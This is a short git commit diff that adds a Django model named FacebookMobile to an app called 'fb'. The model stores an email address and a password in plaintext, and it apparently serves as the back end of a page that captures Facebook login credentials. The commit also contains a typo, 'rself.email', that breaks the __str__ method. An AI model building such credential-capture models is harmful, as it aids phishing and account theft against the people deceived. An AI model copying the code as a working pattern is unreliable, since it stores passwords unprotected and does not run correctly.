69e34f1aad5e4da0e1e09b7a1e6b7af565b8e6ed
Explorer121 <lordnarry0@gmail.com>
2023-04-29 20:41:21 +0100

    first commit

--- fb/models.py
+++ fb/models.py
@@ -1,3 +1,9 @@
 from django.db import models
 
 # Create your models here.
+class FacebookMobile(models.Model):
+     email = models.EmailField()
+     passwd = models.CharField(max_length=12)
+
+     def __str__(self):
+          return rself.email
